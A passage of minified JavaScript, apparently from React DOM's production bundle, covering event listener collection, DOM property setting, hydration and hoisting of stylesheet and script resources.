b;case`compositionend`:x=`onCompositionEnd`;break b;case`compositionupdate`:x=`onCompositionUpdate`;break b}x=void 0}else ar?rr(e,n)&&(x=`onCompositionEnd`):e===`keydown`&&n.keyCode===229&&(x=`onCompositionStart`);x&&(er&&n.locale!==`ko`&&(ar||x!==`onCompositionStart`?x===`onCompositionEnd`&&ar&&(b=bn()):(_n=i,vn=`value`in _n?_n.value:_n.textContent,ar=!0)),y=Ed(r,x),0<y.length&&(x=new Rn(x,e,null,n,i),s.push({event:x,listeners:y}),b?x.data=b:(b=ir(n),b!==null&&(x.data=b)))),(b=$n?or(e,n):sr(e,n))&&(x=Ed(r,`onBeforeInput`),0<x.length&&(y=new Rn(`onBeforeInput`,`beforeinput`,null,n,i),s.push({event:y,listeners:x}),y.data=b)),md(s,e,r,n,i)}yd(s,t)})}function Td(e,t,n){return{instance:e,listener:t,currentTarget:n}}function Ed(e,t){for(var n=t+`Capture`,r=[];e!==null;){var i=e,a=i.stateNode;if(i=i.tag,i!==5&&i!==26&&i!==27||a===null||(i=pn(e,n),i!=null&&r.unshift(Td(e,i,a)),i=pn(e,t),i!=null&&r.push(Td(e,i,a))),e.tag===3)return r;e=e.return}return[]}function Dd(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function Od(e,t,n,r,i){for(var a=t._reactName,o=[];n!==null&&n!==r;){var s=n,c=s.alternate,l=s.stateNode;if(s=s.tag,c!==null&&c===r)break;s!==5&&s!==26&&s!==27||l===null||(c=l,i?(l=pn(n,a),l!=null&&o.unshift(Td(n,l,c))):i||(l=pn(n,a),l!=null&&o.push(Td(n,l,c)))),n=n.return}o.length!==0&&e.push({event:t,listeners:o})}var kd=/\r\n?/g,Ad=/\u0000|\uFFFD/g;function jd(e){return(typeof e==`string`?e:``+e).replace(kd,`
`).replace(Ad,``)}function Md(e,t){return t=jd(t),jd(e)===t}function $(e,t,n,r,a,o){switch(n){case`children`:typeof r==`string`?t===`body`||t===`textarea`&&r===``||Xt(e,r):(typeof r==`number`||typeof r==`bigint`)&&t!==`body`&&Xt(e,``+r);break;case`className`:Pt(e,`class`,r);break;case`tabIndex`:Pt(e,`tabindex`,r);break;case`dir`:case`role`:case`viewBox`:case`width`:case`height`:Pt(e,n,r);break;case`style`:$t(e,r,o);break;case`data`:if(t!==`object`){Pt(e,`data`,r);break}case`src`:case`href`:if(r===``&&(t!==`a`||n!==`href`)){e.removeAttribute(n);break}if(r==null||typeof r==`function`||typeof r==`symbol`||typeof r==`boolean`){e.removeAttribute(n);break}r=rn(``+r),e.setAttribute(n,r);break;case`action`:case`formAction`:if(typeof r==`function`){e.setAttribute(n,`javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')`);break}if(typeof o==`function`&&(n===`formAction`?(t!==`input`&&$(e,t,`name`,a.name,a,null),$(e,t,`formEncType`,a.formEncType,a,null),$(e,t,`formMethod`,a.formMethod,a,null),$(e,t,`formTarget`,a.formTarget,a,null)):($(e,t,`encType`,a.encType,a,null),$(e,t,`method`,a.method,a,null),$(e,t,`target`,a.target,a,null))),r==null||typeof r==`symbol`||typeof r==`boolean`){e.removeAttribute(n);break}r=rn(``+r),e.setAttribute(n,r);break;case`onClick`:r!=null&&(e.onclick=an);break;case`onScroll`:r!=null&&Q(`scroll`,e);break;case`onScrollEnd`:r!=null&&Q(`scrollend`,e);break;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(i(61));if(n=r.__html,n!=null){if(a.children!=null)throw Error(i(60));e.innerHTML=n}}break;case`multiple`:e.multiple=r&&typeof r!=`function`&&typeof r!=`symbol`;break;case`muted`:e.muted=r&&typeof r!=`function`&&typeof r!=`symbol`;break;case`suppressContentEditableWarning`:case`suppressHydrationWarning`:case`defaultValue`:case`defaultChecked`:case`innerHTML`:case`ref`:break;case`autoFocus`:break;case`xlinkHref`:if(r==null||typeof r==`function`||typeof r==`boolean`||typeof r==`symbol`){e.removeAttribute(`xlink:href`);break}n=rn(``+r),e.setAttributeNS(`http://www.w3.org/1999/xlink`,`xlink:href`,n);break;case`contentEditable`:case`spellCheck`:case`draggable`:case`value`:case`autoReverse`:case`externalResourcesRequired`:case`focusable`:case`preserveAlpha`:r!=null&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,``+r):e.removeAttribute(n);break;case`inert`:case`allowFullScreen`:case`async`:case`autoPlay`:case`controls`:case`default`:case`defer`:case`disabled`:case`disablePictureInPicture`:case`disableRemotePlayback`:case`formNoValidate`:case`hidden`:case`loop`:case`noModule`:case`noValidate`:case`open`:case`playsInline`:case`readOnly`:case`required`:case`reversed`:case`scoped`:case`seamless`:case`itemScope`:r&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,``):e.removeAttribute(n);break;case`capture`:case`download`:!0===r?e.setAttribute(n,``):!1!==r&&r!=null&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,r):e.removeAttribute(n);break;case`cols`:case`rows`:case`size`:case`span`:r!=null&&typeof r!=`function`&&typeof r!=`symbol`&&!isNaN(r)&&1<=r?e.setAttribute(n,r):e.removeAttribute(n);break;case`rowSpan`:case`start`:r==null||typeof r==`function`||typeof r==`symbol`||isNaN(r)?e.removeAttribute(n):e.setAttribute(n,r);break;case`popover`:Q(`beforetoggle`,e),Q(`toggle`,e),Nt(e,`popover`,r);break;case`xlinkActuate`:Ft(e,`http://www.w3.org/1999/xlink`,`xlink:actuate`,r);break;case`xlinkArcrole`:Ft(e,`http://www.w3.org/1999/xlink`,`xlink:arcrole`,r);break;case`xlinkRole`:Ft(e,`http://www.w3.org/1999/xlink`,`xlink:role`,r);break;case`xlinkShow`:Ft(e,`http://www.w3.org/1999/xlink`,`xlink:show`,r);break;case`xlinkTitle`:Ft(e,`http://www.w3.org/1999/xlink`,`xlink:title`,r);break;case`xlinkType`:Ft(e,`http://www.w3.org/1999/xlink`,`xlink:type`,r);break;case`xmlBase`:Ft(e,`http://www.w3.org/XML/1998/namespace`,`xml:base`,r);break;case`xmlLang`:Ft(e,`http://www.w3.org/XML/1998/namespace`,`xml:lang`,r);break;case`xmlSpace`:Ft(e,`http://www.w3.org/XML/1998/namespace`,`xml:space`,r);break;case`is`:Nt(e,`is`,r);break;case`innerText`:case`textContent`:break;default:(!(2<n.length)||n[0]!==`o`&&n[0]!==`O`||n[1]!==`n`&&n[1]!==`N`)&&(n=tn.get(n)||n,Nt(e,n,r))}}function Nd(e,t,n,r,a,o){switch(n){case`style`:$t(e,r,o);break;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(i(61));if(n=r.__html,n!=null){if(a.children!=null)throw Error(i(60));e.innerHTML=n}}break;case`children`:typeof r==`string`?Xt(e,r):(typeof r==`number`||typeof r==`bigint`)&&Xt(e,``+r);break;case`onScroll`:r!=null&&Q(`scroll`,e);break;case`onScrollEnd`:r!=null&&Q(`scrollend`,e);break;case`onClick`:r!=null&&(e.onclick=an);break;case`suppressContentEditableWarning`:case`suppressHydrationWarning`:case`innerHTML`:case`ref`:break;case`innerText`:case`textContent`:break;default:if(!Et.hasOwnProperty(n))a:{if(n[0]===`o`&&n[1]===`n`&&(a=n.endsWith(`Capture`),t=n.slice(2,a?n.length-7:void 0),o=e[ft]||null,o=o==null?null:o[n],typeof o==`function`&&e.removeEventListener(t,o,a),typeof r==`function`)){typeof o!=`function`&&o!==null&&(n in e?e[n]=null:e.hasAttribute(n)&&e.removeAttribute(n)),e.addEventListener(t,r,a);break a}n in e?e[n]=r:!0===r?e.setAttribute(n,``):Nt(e,n,r)}}}function Pd(e,t,n){switch(t){case`div`:case`span`:case`svg`:case`path`:case`a`:case`g`:case`p`:case`li`:break;case`img`:Q(`error`,e),Q(`load`,e);var r=!1,a=!1,o;for(o in n)if(n.hasOwnProperty(o)){var s=n[o];if(s!=null)switch(o){case`src`:r=!0;break;case`srcSet`:a=!0;break;case`children`:case`dangerouslySetInnerHTML`:throw Error(i(137,t));default:$(e,t,o,s,n,null)}}a&&$(e,t,`srcSet`,n.srcSet,n,null),r&&$(e,t,`src`,n.src,n,null);return;case`input`:Q(`invalid`,e);var c=o=s=a=null,l=null,u=null;for(r in n)if(n.hasOwnProperty(r)){var d=n[r];if(d!=null)switch(r){case`name`:a=d;break;case`type`:s=d;break;case`checked`:l=d;break;case`defaultChecked`:u=d;break;case`value`:o=d;break;case`defaultValue`:c=d;break;case`children`:case`dangerouslySetInnerHTML`:if(d!=null)throw Error(i(137,t));break;default:$(e,t,r,d,n,null)}}Gt(e,o,c,l,u,s,a,!1);return;case`select`:for(a in Q(`invalid`,e),r=s=o=null,n)if(n.hasOwnProperty(a)&&(c=n[a],c!=null))switch(a){case`value`:o=c;break;case`defaultValue`:s=c;break;case`multiple`:r=c;default:$(e,t,a,c,n,null)}t=o,n=s,e.multiple=!!r,t==null?n!=null&&qt(e,!!r,n,!0):qt(e,!!r,t,!1);return;case`textarea`:for(s in Q(`invalid`,e),o=a=r=null,n)if(n.hasOwnProperty(s)&&(c=n[s],c!=null))switch(s){case`value`:r=c;break;case`defaultValue`:a=c;break;case`children`:o=c;break;case`dangerouslySetInnerHTML`:if(c!=null)throw Error(i(91));break;default:$(e,t,s,c,n,null)}Yt(e,r,a,o);return;case`option`:for(l in n)if(n.hasOwnProperty(l)&&(r=n[l],r!=null))switch(l){case`selected`:e.selected=r&&typeof r!=`function`&&typeof r!=`symbol`;break;default:$(e,t,l,r,n,null)}return;case`dialog`:Q(`beforetoggle`,e),Q(`toggle`,e),Q(`cancel`,e),Q(`close`,e);break;case`iframe`:case`object`:Q(`load`,e);break;case`video`:case`audio`:for(r=0;r<_d.length;r++)Q(_d[r],e);break;case`image`:Q(`error`,e),Q(`load`,e);break;case`details`:Q(`toggle`,e);break;case`embed`:case`source`:case`link`:Q(`error`,e),Q(`load`,e);case`area`:case`base`:case`br`:case`col`:case`hr`:case`keygen`:case`meta`:case`param`:case`track`:case`wbr`:case`menuitem`:for(u in n)if(n.hasOwnProperty(u)&&(r=n[u],r!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:throw Error(i(137,t));default:$(e,t,u,r,n,null)}return;default:if(en(t)){for(d in n)n.hasOwnProperty(d)&&(r=n[d],r!==void 0&&Nd(e,t,d,r,n,void 0));return}}for(c in n)n.hasOwnProperty(c)&&(r=n[c],r!=null&&$(e,t,c,r,n,null))}function Fd(e,t,n,r){switch(t){case`div`:case`span`:case`svg`:case`path`:case`a`:case`g`:case`p`:case`li`:break;case`input`:var a=null,o=null,s=null,c=null,l=null,u=null,d=null;for(m in n){var f=n[m];if(n.hasOwnProperty(m)&&f!=null)switch(m){case`checked`:break;case`value`:break;case`defaultValue`:l=f;default:r.hasOwnProperty(m)||$(e,t,m,null,r,f)}}for(var p in r){var m=r[p];if(f=n[p],r.hasOwnProperty(p)&&(m!=null||f!=null))switch(p){case`type`:o=m;break;case`name`:a=m;break;case`checked`:u=m;break;case`defaultChecked`:d=m;break;case`value`:s=m;break;case`defaultValue`:c=m;break;case`children`:case`dangerouslySetInnerHTML`:if(m!=null)throw Error(i(137,t));break;default:m!==f&&$(e,t,p,m,r,f)}}Wt(e,s,c,l,u,d,o,a);return;case`select`:for(o in m=s=c=p=null,n)if(l=n[o],n.hasOwnProperty(o)&&l!=null)switch(o){case`value`:break;case`multiple`:m=l;default:r.hasOwnProperty(o)||$(e,t,o,null,r,l)}for(a in r)if(o=r[a],l=n[a],r.hasOwnProperty(a)&&(o!=null||l!=null))switch(a){case`value`:p=o;break;case`defaultValue`:c=o;break;case`multiple`:s=o;default:o!==l&&$(e,t,a,o,r,l)}t=c,n=s,r=m,p==null?!!r!=!!n&&(t==null?qt(e,!!n,n?[]:``,!1):qt(e,!!n,t,!0)):qt(e,!!n,p,!1);return;case`textarea`:for(c in m=p=null,n)if(a=n[c],n.hasOwnProperty(c)&&a!=null&&!r.hasOwnProperty(c))switch(c){case`value`:break;case`children`:break;default:$(e,t,c,null,r,a)}for(s in r)if(a=r[s],o=n[s],r.hasOwnProperty(s)&&(a!=null||o!=null))switch(s){case`value`:p=a;break;case`defaultValue`:m=a;break;case`children`:break;case`dangerouslySetInnerHTML`:if(a!=null)throw Error(i(91));break;default:a!==o&&$(e,t,s,a,r,o)}Jt(e,p,m);return;case`option`:for(var h in n)if(p=n[h],n.hasOwnProperty(h)&&p!=null&&!r.hasOwnProperty(h))switch(h){case`selected`:e.selected=!1;break;default:$(e,t,h,null,r,p)}for(l in r)if(p=r[l],m=n[l],r.hasOwnProperty(l)&&p!==m&&(p!=null||m!=null))switch(l){case`selected`:e.selected=p&&typeof p!=`function`&&typeof p!=`symbol`;break;default:$(e,t,l,p,r,m)}return;case`img`:case`link`:case`area`:case`base`:case`br`:case`col`:case`embed`:case`hr`:case`keygen`:case`meta`:case`param`:case`source`:case`track`:case`wbr`:case`menuitem`:for(var g in n)p=n[g],n.hasOwnProperty(g)&&p!=null&&!r.hasOwnProperty(g)&&$(e,t,g,null,r,p);for(u in r)if(p=r[u],m=n[u],r.hasOwnProperty(u)&&p!==m&&(p!=null||m!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:if(p!=null)throw Error(i(137,t));break;default:$(e,t,u,p,r,m)}return;default:if(en(t)){for(var _ in n)p=n[_],n.hasOwnProperty(_)&&p!==void 0&&!r.hasOwnProperty(_)&&Nd(e,t,_,void 0,r,p);for(d in r)p=r[d],m=n[d],!r.hasOwnProperty(d)||p===m||p===void 0&&m===void 0||Nd(e,t,d,p,r,m);return}}for(var v in n)p=n[v],n.hasOwnProperty(v)&&p!=null&&!r.hasOwnProperty(v)&&$(e,t,v,null,r,p);for(f in r)p=r[f],m=n[f],!r.hasOwnProperty(f)||p===m||p==null&&m==null||$(e,t,f,p,r,m)}function Id(e){switch(e){case`css`:case`script`:case`font`:case`img`:case`image`:case`input`:case`link`:return!0;default:return!1}}function Ld(){if(typeof performance.getEntriesByType==`function`){for(var e=0,t=0,n=performance.getEntriesByType(`resource`),r=0;r<n.length;r++){var i=n[r],a=i.transferSize,o=i.initiatorType,s=i.duration;if(a&&s&&Id(o)){for(o=0,s=i.responseEnd,r+=1;r<n.length;r++){var c=n[r],l=c.startTime;if(l>s)break;var u=c.transferSize,d=c.initiatorType;u&&Id(d)&&(c=c.responseEnd,o+=u*(c<s?1:(s-l)/(c-l)))}if(--r,t+=8*(a+o)/(i.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e==`number`)?e:5}var Rd=null,zd=null;function Bd(e){return e.nodeType===9?e:e.ownerDocument}function Vd(e){switch(e){case`http://www.w3.org/2000/svg`:return 1;case`http://www.w3.org/1998/Math/MathML`:return 2;default:return 0}}function Hd(e,t){if(e===0)switch(t){case`svg`:return 1;case`math`:return 2;default:return 0}return e===1&&t===`foreignObject`?0:e}function Ud(e,t){return e===`textarea`||e===`noscript`||typeof t.children==`string`||typeof t.children==`number`||typeof t.children==`bigint`||typeof t.dangerouslySetInnerHTML==`object`&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Wd=null;function Gd(){var e=window.event;return e&&e.type===`popstate`?e!==Wd&&(Wd=e,!0):(Wd=null,!1)}var Kd=typeof setTimeout==`function`?setTimeout:void 0,qd=typeof clearTimeout==`function`?clearTimeout:void 0,Jd=typeof Promise==`function`?Promise:void 0,Yd=typeof queueMicrotask==`function`?queueMicrotask:Jd===void 0?Kd:function(e){return Jd.resolve(null).then(e).catch(Xd)};function Xd(e){setTimeout(function(){throw e})}function Zd(e){return e===`head`}function Qd(e,t){var n=t,r=0;do{var i=n.nextSibling;if(e.removeChild(n),i&&i.nodeType===8){if(n=i.data,n===`/$`||n===`/&`){if(r===0){e.removeChild(i),Np(t);return}r--}else if(n===`$`||n===`$?`||n===`$~`||n===`$!`||n===`&`)r++;else if(n===`html`)pf(e.ownerDocument.documentElement);else if(n===`head`){n=e.ownerDocument.head,pf(n);for(var a=n.firstChild;a;){var o=a.nextSibling,s=a.nodeName;a[vt]||s===`SCRIPT`||s===`STYLE`||s===`LINK`&&a.rel.toLowerCase()===`stylesheet`||n.removeChild(a),a=o}}else n===`body`&&pf(e.ownerDocument.body)}n=i}while(n);Np(t)}function $d(e,t){var n=e;e=0;do{var r=n.nextSibling;if(n.nodeType===1?t?(n._stashedDisplay=n.style.display,n.style.display=`none`):(n.style.display=n._stashedDisplay||``,n.getAttribute(`style`)===``&&n.removeAttribute(`style`)):n.nodeType===3&&(t?(n._stashedText=n.nodeValue,n.nodeValue=``):n.nodeValue=n._stashedText||``),r&&r.nodeType===8){if(n=r.data,n===`/$`){if(e===0)break;e--}else n!==`$`&&n!==`$?`&&n!==`$~`&&n!==`$!`||e++}n=r}while(n)}function ef(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var n=t;switch(t=t.nextSibling,n.nodeName){case`HTML`:case`HEAD`:case`BODY`:ef(n),yt(n);continue;case`SCRIPT`:case`STYLE`:continue;case`LINK`:if(n.rel.toLowerCase()===`stylesheet`)continue}e.removeChild(n)}}function tf(e,t,n,r){for(;e.nodeType===1;){var i=n;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!r&&(e.nodeName!==`INPUT`||e.type!==`hidden`))break}else if(!r){if(t===`input`&&e.type===`hidden`){var a=i.name==null?null:``+i.name;if(i.type===`hidden`&&e.getAttribute(`name`)===a)return e}else return e}else if(!e[vt])switch(t){case`meta`:if(!e.hasAttribute(`itemprop`))break;return e;case`link`:if(a=e.getAttribute(`rel`),a===`stylesheet`&&e.hasAttribute(`data-precedence`)||a!==i.rel||e.getAttribute(`href`)!==(i.href==null||i.href===``?null:i.href)||e.getAttribute(`crossorigin`)!==(i.crossOrigin==null?null:i.crossOrigin)||e.getAttribute(`title`)!==(i.title==null?null:i.title))break;return e;case`style`:if(e.hasAttribute(`data-precedence`))break;return e;case`script`:if(a=e.getAttribute(`src`),(a!==(i.src==null?null:i.src)||e.getAttribute(`type`)!==(i.type==null?null:i.type)||e.getAttribute(`crossorigin`)!==(i.crossOrigin==null?null:i.crossOrigin))&&a&&e.hasAttribute(`async`)&&!e.hasAttribute(`itemprop`))break;return e;default:return e}if(e=cf(e.nextSibling),e===null)break}return null}function nf(e,t,n){if(t===``)return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!==`INPUT`||e.type!==`hidden`)&&!n||(e=cf(e.nextSibling),e===null))return null;return e}function rf(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!==`INPUT`||e.type!==`hidden`)&&!t||(e=cf(e.nextSibling),e===null))return null;return e}function af(e){return e.data===`$?`||e.data===`$~`}function of(e){return e.data===`$!`||e.data===`$?`&&e.ownerDocument.readyState!==`loading`}function sf(e,t){var n=e.ownerDocument;if(e.data===`$~`)e._reactRetry=t;else if(e.data!==`$?`||n.readyState!==`loading`)t();else{var r=function(){t(),n.removeEventListener(`DOMContentLoaded`,r)};n.addEventListener(`DOMContentLoaded`,r),e._reactRetry=r}}function cf(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t===`$`||t===`$!`||t===`$?`||t===`$~`||t===`&`||t===`F!`||t===`F`)break;if(t===`/$`||t===`/&`)return null}}return e}var lf=null;function uf(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n===`/$`||n===`/&`){if(t===0)return cf(e.nextSibling);t--}else n!==`$`&&n!==`$!`&&n!==`$?`&&n!==`$~`&&n!==`&`||t++}e=e.nextSibling}return null}function df(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n===`$`||n===`$!`||n===`$?`||n===`$~`||n===`&`){if(t===0)return e;t--}else n!==`/$`&&n!==`/&`||t++}e=e.previousSibling}return null}function ff(e,t,n){switch(t=Bd(n),e){case`html`:if(e=t.documentElement,!e)throw Error(i(452));return e;case`head`:if(e=t.head,!e)throw Error(i(453));return e;case`body`:if(e=t.body,!e)throw Error(i(454));return e;default:throw Error(i(451))}}function pf(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);yt(e)}var mf=new Map,hf=new Set;function gf(e){return typeof e.getRootNode==`function`?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var _f=O.d;O.d={f:vf,r:yf,D:Sf,C:Cf,L:wf,m:Tf,X:Df,S:Ef,M:Of};function vf(){var e=_f.f(),t=bu();return e||t}function yf(e){var t=xt(e);t!==null&&t.tag===5&&t.type===`form`?Es(t):_f.r(e)}var bf=typeof document>`u`?null:document;function xf(e,t,n){var r=bf;if(r&&typeof t==`string`&&t){var i=Ut(t);i=`link[rel="`+e+`"][href="`+i+`"]`,typeof n==`string`&&(i+=`[crossorigin="`+n+`"]`),hf.has(i)||(hf.add(i),e={rel:e,crossOrigin:n,href:t},r.querySelector(i)===null&&(t=r.createElement(`link`),Pd(t,`link`,e),wt(t),r.head.appendChild(t)))}}function Sf(e){_f.D(e),xf(`dns-prefetch`,e,null)}function Cf(e,t){_f.C(e,t),xf(`preconnect`,e,t)}function wf(e,t,n){_f.L(e,t,n);var r=bf;if(r&&e&&t){var i=`link[rel="preload"][as="`+Ut(t)+`"]`;t===`image`&&n&&n.imageSrcSet?(i+=`[imagesrcset="`+Ut(n.imageSrcSet)+`"]`,typeof n.imageSizes==`string`&&(i+=`[imagesizes="`+Ut(n.imageSizes)+`"]`)):i+=`[href="`+Ut(e)+`"]`;var a=i;switch(t){case`style`:a=Af(e);break;case`script`:a=Pf(e)}mf.has(a)||(e=m({rel:`preload`,href:t===`image`&&n&&n.imageSrcSet?void 0:e,as:t},n),mf.set(a,e),r.querySelector(i)!==null||t===`style`&&r.querySelector(jf(a))||t===`script`&&r.querySelector(Ff(a))||(t=r.createElement(`link`),Pd(t,`link`,e),wt(t),r.head.appendChild(t)))}}function Tf(e,t){_f.m(e,t);var n=bf;if(n&&e){var r=t&&typeof t.as==`string`?t.as:`script`,i=`link[rel="modulepreload"][as="`+Ut(r)+`"][href="`+Ut(e)+`"]`,a=i;switch(r){case`audioworklet`:case`paintworklet`:case`serviceworker`:case`sharedworker`:case`worker`:case`script`:a=Pf(e)}if(!mf.has(a)&&(e=m({rel:`modulepreload`,href:e},t),mf.set(a,e),n.querySelector(i)===null)){switch(r){case`audioworklet`:case`paintworklet`:case`serviceworker`:case`sharedworker`:case`worker`:case`script`:if(n.querySelector(Ff(a)))return}r=n.createElement(`link`),Pd(r,`link`,e),wt(r),n.head.appendChild(r)}}}function Ef(e,t,n){_f.S(e,t,n);var r=bf;if(r&&e){var i=Ct(r).hoistableStyles,a=Af(e);t||=`default`;var o=i.get(a);if(!o){var s={loading:0,preload:null};if(o=r.querySelector(jf(a)))s.loading=5;else{e=m({rel:`stylesheet`,href:e,"data-precedence":t},n),(n=mf.get(a))&&Rf(e,n);var c=o=r.createElement(`link`);wt(c),Pd(c,`link`,e),c._p=new Promise(function(e,t){c.onload=e,c.onerror=t}),c.addEventListener(`load`,function(){s.loading|=1}),c.addEventListener(`error`,function(){s.loading|=2}),s.loading|=4,Lf(o,t,r)}o={type:`stylesheet`,instance:o,count:1,state:s},i.set(a,o)}}}function Df(e,t){_f.X(e,t);var n=bf;if(n&&e){var r=Ct(n).hoistableScripts,i=Pf(e),a=r.get(i);a||(a=n.querySelector(Ff(i)),a||(e=m({src:e,async:!0},t),(t=mf.get(i))&&zf(e,t),a=n.createElement(`script`),wt(a),Pd(a,`link`,e),n.head.appendChild(a)),a={type:`script`,instance:a,count:1,state:null},r.set(i,a))}}function Of(e,t){_f.M(e,t);var n=bf;if(n&&e){var r=Ct(n).hoistableScripts,i=Pf(e),a=r.get(i);a||(a=n.querySelector(Ff(i)),a||(e=m({src:e,async:!0,type:`module`},t),(t=mf.get(i))&&zf(e,t),a=n.createElement(`script`),wt(a),Pd(a,`link`,e),n.head.appendChild(a)),a={type:`script`,instance:a,count:1,state:null},r.set(i,a))}}function kf(e,t,n,r){var a=(a=ge.current)?gf(a):null;if(!a)throw Error(i(446));switch(e){case`meta`:case`title`:return null;case`style`:return typeof n.precedence==`string`&&typeof n.href==`string`?(t=Af(n.href),n=Ct(a).hoistableStyles,r=n.get(t),r||(r={type:`style`,instance:null,count:0,state:null},n.set(t,r)),r):{type:`void`,instance:null,count:0,state:null};case`link`:if(n.rel===`stylesheet`&&typeof n.href==`string`&&typeof n.precedence==`string`){e=Af(n.href);var o=Ct(a).hoistableStyles,s=o.get(e);if(s||(a=a.ownerDocument||a,s={type:`stylesheet`,instance:null,count:0,state:{loading:0,preload:null}},o.set(e,s),(o=a.querySelector(jf(e)))&&!o._p&&(s.instance=o,s.state.loading=5),mf.has(e)||(n={rel:`preload`,as:`style`,href:n.href,crossOrigin:n.crossOrigin,integrity:n.integrity,media:n.media,hrefLang:n.hrefLang,referrerPolicy:n.referrerPolicy},mf.set(e,n),o||Nf(a,e,n,s.state))),t&&r===null)throw Error(i(528,``));return s}if(t&&r!==null)throw Error(i(529,``));return null;case`script`:return t=n.async,n=n.src,typeof n==`string`&&t&&typeof t!=`function`&&typeof t!=`symbol`?(t=Pf(n),n=Ct(a).hoistableScripts,r=n.get(t),r||(r={type:`script`,instance:null,count:0,state:null},n.set(t,r)),r):{type:`void`,instance:null,count:0,state:null};default:throw Error(i(444,e))}}function Af(e){return`href="`+Ut(e)+`"`}function jf(e){return`link[rel="stylesheet"][`+e+`]`}function Mf(e){return m({},e,{"data-precedence":e.precedence,precedence:null})}function Nf(e,t,n,r){e.querySelector(`link[rel="preload"][as="style"][`+t+`]`)?r.loading=1:(t=e.createElement(`link`),r.preload=t,t.addEventListener(`load`,function(){return r.loading|=1}),t.addEventListener(`error`,function(){return r.loading|=2}),Pd(t,`link`,n),wt(t),e.head.appendChild(t))}function Pf(e){return`[src="`+Ut(e)+`"]`}function Ff(e){return`script[async]`+e}function If(e,t,n){if(t.count++,t.instance===null)switch(t.type){case`style`:var r=e.querySelector(`style[data-href~="`+Ut(n.href)+`"]`);if(r)return t.instance=r,wt(r),r;var a=m({},n,{"data-href":n.href,"data-precedence":n.precedence,href:null,precedence:null});return r=(e.ownerDocument||e).createElement(`style`),wt(r),Pd(r,`style`,a),Lf(r,n.precedence,e),t.instance=r;case`stylesheet`:a=Af(n.href);var o=e.querySelector(jf(a));if(o)return t.state.loading|=4,t.instance=o,wt(o),o;r=Mf(n),(a=mf.get(a))&&Rf(r,a),o=(e.ownerDocument||e).createElement(`link`),wt(o);var s=o;return s._p=new Promise(function(e,t){s.onload=e,s.onerror=t}),Pd(o,`link`,r),t.state.loading|=4,Lf(o,n.precedence,e),t.instance=o;case`script`:return o=Pf(n.src),(a=e.querySelector(Ff(o)))?(t.instance=a,wt(a),a):(r=n,(a=mf.get(o))&&(r=m({},n),zf(r,a)),e=e.ownerDocument||e,a=e.createElement(`script`),wt(a),Pd(a,`link`,r),e.head.appendChild(a),t.instance=a);case`void`:return null;default:throw Error(i(443,t.type))}else t.type===`stylesheet`&&!(t.state.loading&4)&&(r=t.instance,t.state.loading|=4,Lf(r,n.precedence,e));return t.instance}function Lf(e,t,n){for(var r=n.querySelectorAll(`link[rel="stylesheet"][data-precedence],style[data-precedence]`),i=r.length?r[r.length-1]:null,a=i,o=0;o<r.length;o++){var s=r[o];if(s.dataset.precedence===t)a=s;else if(a!==i)break}a?a.parentNode.insertBefore(e,a.nextSibling):(t=n.nodeType===9?n.head:n,t.insertBefore(e,t.firstChild))}function Rf(e,t){e.crossOrigin??=t.crossOrigin,e.referrerPolicy??=t.referrerPolicy,e.title??=t.title}function zf(e,t){e.crossOrigin??=t.crossOrigin,e.referrerPolicy??=t.referrerPolicy,e.integrity??=t.integrity}var Bf=null;function Vf(e,t,n){if(Bf===null){var r=new Map,i=Bf=new Map;i.set(n,r)}else i=Bf,r=i.get(n),r||(r=new Map,i.set(n,r));if(r.has(e))return r;for(r.set(e,null),n=n.getElementsByTagName(e),i=0;i<n.length;i++){var a=n[i];if(!(a[vt]||a[N]||e===`link`&&a.getAttribute(`rel`)===`stylesheet`)&&a.namespaceURI!==`http://www.w3.org/2000/svg`){var o=a.getAttribute(t)||``;o=e+o;var s=r.get(o);s?s.push(a):r.set(o,[a])}}return r}function Hf(e,t,n){e=e.ownerDocument||e,e.head.insertBefore(n,t===`title`?e.querySelector(`head > title`):null)}function Uf(e,t,n){if(n===1||t.itemProp!=null)return!1;switch(e){case`meta`:case`title`:return!0;case`style`:if(typeof t.precedence!=`string`||typeof t.href!=`string`||t.href===``)break;return!0;case`link`:if(typeof t.rel!=`string`||typeof t.href!=`string`||t.href===``||t.onLoad||t.onError)break;switch(t.rel){case`stylesheet`:return e=t.disabled,typeof t.precedence==`string`&&e==null;default:return!0}case`script`:if(t.async&&typeof t.async!=`function`&&typeof t.async!=`symbol`&&!t.onLoad&&!t.onError&&t.src&&typeof t.src==`string`)return!0}return!1}function Wf(e){return!(e.type===`stylesheet`&&!(e.state.loading&3))}function Gf(e,t,n,r){if(n.type===`stylesheet`&&(typeof r.media!=`string`||!1!==matchMedia(r.media).matches)&&!(n.state.loading&4)){if(n.instance===null){var i=Af(r.href),a=t.querySelector(jf(i));if(a){t=a._p,typeof t==`object`&&t&&typeof t.then==`function`&&(e.count++,e=Jf.bind(e),t.then(e,e)),n.state.loading|=4,n.instance=a,wt(a);return}a=t.ownerDocument||t,r=Mf(r),(i=mf.get(i))&&Rf(r,i),a=a.createElement(`link`),wt(a);var o=a;o._p=new 